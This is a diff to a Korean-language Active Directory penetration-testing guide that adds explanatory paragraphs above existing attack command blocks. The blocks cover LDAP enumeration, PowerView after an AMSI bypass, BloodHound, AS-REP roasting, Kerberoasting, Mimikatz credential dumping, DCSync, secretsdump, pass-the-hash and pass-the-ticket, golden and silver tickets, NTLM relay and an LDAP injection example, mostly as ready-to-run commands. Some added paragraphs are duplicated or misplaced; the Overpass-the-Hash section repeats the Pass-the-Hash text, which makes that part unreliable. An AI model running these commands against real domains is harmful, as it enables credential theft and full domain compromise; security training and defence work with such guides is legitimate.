@@ -2,6 +2,9 @@
 
 ## AD 구조 이해
 
+
+Active Directory 도메인은 Forest → Domain → OU 계층으로 구성됩니다. Domain Controller(DC)가 LDAP(389), Kerberos(88), DNS(53), SMB(445) 서비스를 중앙 제공하며, 이 서비스들이 주요 공격 대상이 됩니다.
+
 ```
 Active Directory 도메인 구조:
   
@@ -28,6 +31,9 @@ Active Directory 도메인 구조:
 
 ### 익명/인증된 LDAP 열거
 
+
+LDAP(Lightweight Directory Access Protocol)으로 AD의 사용자·그룹·컴퓨터 목록을 조회합니다. 익명 바인드가 허용된 경우 인증 없이도 도메인 정보를 덤프할 수 있으며, 인증된 사용자 계정이 있으면 더 많은 정보를 수집할 수 있습니다.
+
 ```bash
 # LDAP 익명 조회 시도
 ldapsearch -x -h DC_IP -b "dc=company,dc=local"
@@ -52,6 +58,9 @@ ldapsearch -x -h DC_IP -D "COMPANY\user" -w "Password123" \
 ```
 
 ### PowerView (도메인 내부 정찰)
+
+
+PowerView는 PowerShell 기반 AD 정찰 모듈입니다. `Get-DomainUser`, `Get-DomainGroup` 등의 명령으로 도메인 객체를 상세히 열거하고, AMSI(Anti-Malware Scan Interface) 우회 후 메모리에서 직접 실행하여 디스크 흔적을 줄입니다.
 
 ```powershell
 # PowerView 로드 (AMSI 우회 후)
@@ -94,6 +103,9 @@ Get-DomainGPOLocalGroup                        # GPO로 관리되는 로컬 그�
 
 ### BloodHound — 공격 경로 시각화
 
+
+BloodHound는 AD 환경의 공격 경로를 그래프로 시각화하는 도구입니다. SharpHound 수집기로 도메인 데이터를 수집하고 Neo4j 데이터베이스에 저장한 후, 최단 권한 상승 경로를 자동으로 분석합니다.
+
 ```bash
 # 수집기: SharpHound (Windows)
 .\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\
@@ -129,6 +141,8 @@ MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u
 
 ### AS-REP Roasting
 
+Kerberos 사전 인증이 비활성화된 계정의 AS-REP 응답에서 해시를 추출합니다. 도메인 사용자 열거 후 취약한 계정을 대상으로 합니다.
+
 ```bash
 # 사전 인증 비활성화 계정 발견 및 해시 추출
 # Impacket
@@ -152,6 +166,9 @@ hashcat -m 18200 asrep_hashes.txt wordlist.txt
 ```
 
 ### Kerberoasting
+
+
+Kerberoasting은 SPN(Service Principal Name)이 등록된 서비스 계정의 Kerberos TGS 티켓을 요청하여 오프라인으로 크래킹하는 공격입니다. 도메인 일반 사용자 권한만으로 수행 가능하며, 서비스 계정이 취약한 패스워드를 사용할 경우 크랙에 성공합니다.
 
 ```bash
 # SPN 열거 및 서비스 티켓 요청
@@ -182,6 +199,9 @@ hashcat -m 19700 kerberoast_aes.txt wordlist.txt
 ## 3. 자격증명 추출
 
 ### Mimikatz
+
+
+Mimikatz는 Windows 메모리(LSASS 프로세스)에서 패스워드·NTLM 해시·Kerberos 티켓을 추출하는 도구입니다. `sekurlsa::logonpasswords`는 현재 로그인된 모든 사용자의 자격증명을 덤프하며, 관리자 권한이 필요합니다.
 
 ```batch
 rem Mimikatz 실행 (관리자 권한 필요)
@@ -214,6 +234,8 @@ lsadump::dcsync /domain:company.local /all /csv
 
 ### Secretsdump (원격)
 
+impacket-secretsdump로 원격 Windows 시스템에서 SAM, NTDS.dit의 해시를 덤프합니다. SMB를 통해 원격에서 실행하거나 로컬에서 레지스트리 하이브를 직접 파싱합니다.
+
 ```bash
 # 원격 SAM 덤프
 python3 secretsdump.py company.local/Administrator:Password123@TARGET_IP
@@ -234,6 +256,9 @@ python3 secretsdump.py -use-vss company.local/Administrator:Password123@TARGET_I
 
 ### Pass-the-Hash (PtH)
 
+
+Pass-the-Hash(PtH)는 NTLM 해시를 패스워드 복구 없이 그대로 인증에 사용하는 공격입니다. `impacket`의 `psexec.py`, `wmiexec.py` 또는 Mimikatz의 `sekurlsa::pth`로 해시를 이용한 세션을 생성합니다.
+
 ```bash
 # NTLM 해시로 원격 실행
 python3 wmiexec.py -hashes ':NTLM_HASH' company.local/Administrator@TARGET_IP
@@ -250,6 +275,8 @@ evil-winrm -i TARGET_IP \
 
 ### Pass-the-Ticket (PtT)
 
+Pass-the-Ticket은 Kerberos 티켓을 탈취하여 비밀번호 없이 자원에 접근합니다. mimikatz로 추출한 .kirbi 파일을 주입하여 인증을 우회합니다.
+
 ```bash
 # Kerberos 티켓 사용
 # 티켓 파일 임포트 (Mimikatz)
@@ -265,6 +292,9 @@ python3 psexec.py -k -no-pass company.local/user@TARGET_IP
 
 ### Overpass-the-Hash (Pass-the-Key)
 
+
+Pass-the-Hash(PtH)는 NTLM 해시를 패스워드 복구 없이 그대로 인증에 사용하는 공격입니다. `impacket`의 `psexec.py`, `wmiexec.py` 또는 Mimikatz의 `sekurlsa::pth`로 해시를 이용한 세션을 생성합니다.
+
 ```bash
 # NTLM 해시 → Kerberos TGT 획득
 .\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
@@ -278,6 +308,8 @@ python3 psexec.py -k -no-pass company.local/user@TARGET_IP
 ## 5. 도메인 공격
 
 ### DCSync 공격
+
+DCSync 공격은 도메인 컨트롤러 복제 권한으로 모든 사용자의 해시를 추출합니다. Domain Admin 권한이 있거나 DS-Replication 권한이 부여된 계정이 필요합니다.
 
 ```bash
 # 도메인 컨트롤러 복제 권한 있을 때 (DS-Replication-Get-Changes-All)
@@ -293,6 +325,9 @@ python3 secretsdump.py -just-dc-user krbtgt \
 ```
 
 ### Golden Ticket
+
+
+Golden Ticket은 krbtgt 계정의 NTLM 해시를 탈취하여 임의의 사용자와 권한으로 Kerberos TGT를 위조하는 공격입니다. 유효 기간이 매우 길어 장기간 도메인 지속성을 유지하는 데 악용됩니다.
 
 ```bash
 # krbtgt 해시 획득 후 (DCSync)
@@ -321,6 +356,8 @@ python3 psexec.py -k -no-pass company.local/Administrator@DC_IP
 
 ### Silver Ticket
 
+실버 티켓은 서비스 계정 해시로 특정 서비스의 TGS를 위조합니다. 골든 티켓과 달리 도메인 컨트롤러와 통신하지 않아 탐지가 어렵습니다.
+
 ```bash
 # 서비스 계정 해시로 서비스 티켓 위조
 # 예: CIFS 서비스 (파일 공유 접근)
@@ -338,6 +375,8 @@ python3 smbclient.py -k -no-pass company.local/Administrator@server.company.loca
 ---
 
 ## 6. 신뢰 관계 공격
+
+AD 포레스트 간 신뢰 관계를 열거하고 공격합니다. 양방향 트러스트가 있으면 한 도메인의 침해가 연결된 도메인으로 전파될 수 있습니다.
 
 ```bash
 # 포레스트 간 신뢰 열거
@@ -362,6 +401,8 @@ nltest /domain_trusts
 
 ### LDAP 주입
 
+LDAP 인젝션 취약점이 있는 코드와 공격 방법입니다. 사용자 입력을 그대로 LDAP 쿼리에 사용하면 인증 우회나 정보 노출이 발생합니다.
+
 ```python
 # 취약한 인증 코드
 def authenticate(username, password):
@@ -377,6 +418,8 @@ password = "*"
 ```
 
 ### LDAP Relay (NTLM Relay to LDAP)
+
+NTLM 릴레이 공격으로 LDAP에 인증을 릴레이합니다. SMB 서명이 비활성화된 환경에서 도메인 컴퓨터를 추가하거나 ACL을 수정할 수 있습니다.
 
 ```bash
 # ntlmrelayx로 LDAP 릴레이
@@ -394,6 +437,9 @@ python3 ntlmrelayx.py \
 ---
 
 ## 8. BloodHound 공격 경로 활용
+
+
+BloodHound는 AD 환경의 공격 경로를 그래프로 시각화하는 도구입니다. SharpHound 수집기로 도메인 데이터를 수집하고 Neo4j 데이터베이스에 저장한 후, 최단 권한 상승 경로를 자동으로 분석합니다.
 
 ```
 공통 공격 체인 예시:
@@ -418,6 +464,8 @@ python3 ntlmrelayx.py \
          └─[GenericAll on Group]→ 자기 자신을 DA에 추가
 ```
 
+BloodHound에서 침해된 계정과 컴퓨터를 표시하여 공격 경로를 시각화합니다. 도메인 내 최단 권한 상승 경로를 자동으로 파악합니다.
+
 ```bash
 # BloodHound 자동 마킹 — 침해된 계정/컴퓨터 표시
 curl -s -X POST http://localhost:7474/db/data/cypher \
@@ -432,6 +480,9 @@ RETURN u.name, length(p) ORDER BY length(p) LIMIT 5
 ```
 
 ### BloodHound 데이터 수집 자동화 (Python)
+
+
+BloodHound는 AD 환경의 공격 경로를 그래프로 시각화하는 도구입니다. SharpHound 수집기로 도메인 데이터를 수집하고 Neo4j 데이터베이스에 저장한 후, 최단 권한 상승 경로를 자동으로 분석합니다.
 
 ```python
 #!/usr/bin/env python3
@@ -590,6 +641,9 @@ if __name__ == "__main__":
 ## 9. Linux에서 AD 공격 (Impacket 활용)
 
 ### Impacket 설치 및 기본 설정
+
+impacket 도구 모음을 설치합니다. Python 기반으로 SMB, MSRPC, NTLM 등 Windows 프로토콜을 구현한 AD 공격의 핵심 라이브러리입니다.
+
 ```bash
 # Impacket 설치
 pip3 install impacket
@@ -874,6 +928,9 @@ if __name__ == "__main__":
 ```
 
 ### 원격 실행 도구 (Impacket)
+
+impacket psexec.py로 SMB를 통해 원격 명령을 실행합니다. NTLM 해시나 자격증명으로 인증하여 원격 시스템에서 명령을 실행합니다.
+
 ```bash
 # psexec.py — SMB 기반 원격 명령 실행
 python3 psexec.py company.local/Administrator:Password123@TARGET_IP
@@ -895,6 +952,9 @@ python3 wmiexec.py -hashes :NTLM_HASH_HERE company.local/Administrator@TARGET_IP
 ```
 
 ### SMB 관련 도구
+
+impacket smbclient.py로 SMB 공유에 파일을 업로드/다운로드합니다. 자격증명이나 해시로 인증하여 공유 파일시스템에 접근합니다.
+
 ```bash
 # smbclient.py — SMB 파일 접근
 python3 smbclient.py company.local/user:Password123@TARGET_IP
